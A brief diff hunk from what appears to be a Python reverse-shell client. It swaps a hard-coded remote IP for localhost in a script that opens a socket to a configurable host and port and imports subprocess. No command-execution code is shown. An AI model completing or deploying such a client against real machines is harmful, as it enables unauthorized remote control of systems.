@@ -72,7 +72,7 @@ import subprocess
 import os
 import sys
 
-REMOTE_HOST = '191.177.122.163' # Change
+REMOTE_HOST = '127.0.0.1' # Change
 REMOTE_PORT = 8080
 client = socket.socket()
 print("[-] Connection Initiating...")
